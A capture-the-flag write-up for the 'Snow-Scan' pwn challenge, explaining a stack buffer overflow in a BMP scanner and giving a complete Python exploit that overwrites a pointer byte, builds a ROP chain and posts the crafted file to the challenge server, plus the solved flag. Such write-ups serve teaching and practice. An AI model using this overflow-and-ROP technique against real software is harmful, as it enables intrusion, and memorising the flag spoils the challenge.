---
title: "Snow-Scan"
ctf: "HTB Business CTF 2023 — The Great Escape"
date: 2026-06-11
category: pwn
difficulty: easy
points: 1000
flag_format: "HTB{...}"
author: "solve"
---

# Snow-Scan

## Summary

BMP scanner with VLA stack buffer overflow. Partial overwrite of the VLA pointer redirects writes past saved registers to the return address. ROP chain writes "flag.txt" to BSS via a `mov [rdi], rsi` gadget, then calls `printFile`.

## Solution

### Step 1: Exploit

The program reads pixel data into a VLA (`imageSize`=700, valid range 400-900) until EOF with no bounds check. The VLA pointer is stored at `[rbp-0x60]` and reloaded from memory each loop iteration. Overflow padding of 736 bytes reaches the VLA pointer; overwriting its low byte with 0xe0 shifts all subsequent writes higher on the stack. After 0x37 bytes of redirected padding, the return address is overwritten with a ROP chain.

The ROP chain writes the 8-byte string `flag.txt` to a known BSS address using `mov qword ptr [rdi], rsi; ret`, then calls `printFile(BSS)`. Because `flag.txt` is exactly 8 bytes and BSS is zeroed, the null terminator is automatic.

```python
#!/usr/bin/env python3
from pwn import *
import requests, sys, os, re, time

context.arch = 'amd64'
context.log_level = 'info'

REMOTE_URL = 'http://154.57.164.70:31629'
POP_RDI    = 0x401a72
POP_RSI    = 0x40f97e
MOV_QWORD  = 0x44e2bf  # mov qword ptr [rdi], rsi; ret
PRINTFILE  = 0x401fac
BSS        = 0x4c3240 + 32

def build_bmp(payload):
    dummy = open('challenge/dummy.bmp', 'rb').read()
    dataOffset = u32(dummy[10:14])
    header = dummy[:dataOffset]
    total = dataOffset + len(payload)
    header = header[:2] + p32(total) + header[6:]
    return header + payload

def build_exploit():
    rop = b''
    rop += p64(POP_RDI) + p64(BSS) + p64(POP_RSI)
    rop += p64(u64(b'flag.txt')) + p64(MOV_QWORD)
    rop += p64(POP_RDI) + p64(BSS) + p64(PRINTFILE)
    pay = b'\x90' * 736 + b'\xe0' + b'A' * 0x37 + rop
    return pay

for attempt in range(50):
    bmp_data = build_bmp(build_exploit())
    resp = requests.post(f'{REMOTE_URL}/snowscan',
        files={'file': ('exploit.bmp', bmp_data)}, timeout=15)
    text = resp.text
    match = re.search(r'(HTB\{[^}]+\})', text)
    if match:
        print(f'Flag: {match.group(0)}')
        break
    time.sleep(0.2)
```

The exploit succeeds ~10% of the time because the required padding to reach the return address depends on the VLA pointer's low byte, which varies with ASLR.

## Flag

```
HTB{l3t_1t_sn0w_w1th_4n_0v3rfl0w}
```
